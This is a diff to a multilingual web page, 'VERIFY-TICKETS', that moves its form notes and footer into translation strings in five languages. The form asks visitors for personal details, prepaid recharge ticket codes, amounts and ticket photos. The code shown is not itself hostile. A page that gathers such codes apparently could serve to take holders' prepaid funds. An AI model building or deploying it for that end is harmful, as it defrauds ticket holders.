@@ -219,10 +219,10 @@ Vérifiez rapidement et en toute sécurité la validité de vos tickets recharge
 <input type="text" name="prenom" placeholder="Prénoms" required>
 
 <input type="text" name="ville" placeholder="Ville (facultatif)">
-<div class="note">Facultatif</div>
+<div class="note" id="noteVille"></div>
 
 <input type="email" name="email" placeholder="Email" required>
-<div class="note">Résultat envoyé par email</div>
+<div class="note" id="noteEmail"></div>
 
 <div style="display:flex; gap:5px;">
 <select name="indicatif" class="input">
@@ -242,7 +242,7 @@ Vérifiez rapidement et en toute sécurité la validité de vos tickets recharge
 <input type="text" id="type" name="type_ticket" readonly>
 
 <input type="text" name="code_ticket" placeholder="Code du ticket" required style="text-transform:uppercase;">
-<div class="note">Champ obligatoire</div>
+<div class="note" id="noteCode"></div>
 
 <input type="number" name="montant" placeholder="Montant">
 
@@ -253,7 +253,7 @@ Vérifiez rapidement et en toute sécurité la validité de vos tickets recharge
 </select>
 
 <input type="file" id="photo" accept="image/*" multiple>
-<div class="note">Photo (facultatif)</div>
+<div class="note" id="notePhoto"></div>
 
 <img id="preview">
 
@@ -309,9 +309,7 @@ Vérifiez rapidement et en toute sécurité la validité de vos tickets recharge
 
 </div>
 
-<div class="footer">
-© 2026 VERIFY-TICKETS - Tous droits réservés
-</div>
+<div class="footer" id="footerText"></div>
 
 <script>
     let userData = {};
@@ -609,6 +607,12 @@ code:"Code du ticket",
 amount:"Montant",
 photo_note:"Photo du ticket (facultatif)",
 
+note_ville:"Facultatif",
+note_email:"Résultat envoyé par email",
+note_code:"Champ obligatoire",
+note_photo:"Photo (facultatif)",
+footer:"© 2026 VERIFY-TICKETS - Tous droits réservés",
+
 loading:"Traitement en cours...",
 success:"Demande envoyée",
 success_text:"Votre demande a été reçue avec succès.  <strong>Vérifier votre boîte mail<strong> pour voir les résultats.",
@@ -644,6 +648,12 @@ phone:"Phone (optional)",
 code:"Ticket code",
 amount:"Amount",
 photo_note:"Ticket photo (optional)",
+
+note_ville:"Optional",
+note_email:"Result sent by email",
+note_code:"Required field",
+note_photo:"Photo (optional)",
+footer:"© 2026 VERIFY-TICKETS - All rights reserved",
 
 loading:"Processing...",
 success:"Request sent",
@@ -681,6 +691,12 @@ code:"Ticket-Code",
 amount:"Betrag",
 photo_note:"Ticketfoto (optional)",
 
+note_ville:"Optional",
+note_email:"Ergebnis per E-Mail",
+note_code:"Pflichtfeld",
+note_photo:"Foto (optional)",
+footer:"© 2026 VERIFY-TICKETS - Alle Rechte vorbehalten",
+
 loading:"Wird verarbeitet...",
 success:"Anfrage gesendet",
 success_text:"Ihre Anfrage wurde erfolgreich empfangen. <strong>Überprüfen Sie Ihren Posteingang<strong>, um die Ergebnisse zu sehen.",
@@ -717,6 +733,12 @@ code:"Codice biglietto",
 amount:"Importo",
 photo_note:"Foto biglietto (facoltativo)",
 
+note_ville:"Facoltativo",
+note_email:"Risultato via email",
+note_code:"Campo obbligatorio",
+note_photo:"Foto (facoltativa)",
+footer:"© 2026 VERIFY-TICKETS - Tutti i diritti riservati",
+
 loading:"Elaborazione...",
 success:"Richiesta inviata",
 success_text:"La tua richiesta è stata ricevuta con successo. <strong>Controlla la tua casella di posta<strong> per vedere i risultati.",
@@ -752,6 +774,12 @@ phone:"Teléfono (opcional)",
 code:"Código del ticket",
 amount:"Monto",
 photo_note:"Foto del ticket (opcional)",
+
+note_ville:"Opcional",
+note_email:"Resultado por correo",
+note_code:"Campo obligatorio",
+note_photo:"Foto (opcional)",
+footer:"© 2026 VERIFY-TICKETS - Todos los derechos reservados",
 
 loading:"Procesando...",
 success:"Solicitud enviada",
@@ -791,6 +819,11 @@ document.querySelector("input[name='email']").placeholder = t.email;
 document.querySelector("input[name='telephone']").placeholder = t.phone;
 document.querySelector("input[name='code_ticket']").placeholder = t.code;
 document.querySelector("input[name='montant']").placeholder = t.amount;
+document.getElementById("noteVille").innerText = t.note_ville;
+document.getElementById("noteEmail").innerText = t.note_email;
+document.getElementById("noteCode").innerText = t.note_code;
+document.getElementById("notePhoto").innerText = t.note_photo;
+document.getElementById("footerText").innerText = t.footer;
 
 /* boutons services */
 document.querySelectorAll(".card button").forEach(btn=>{
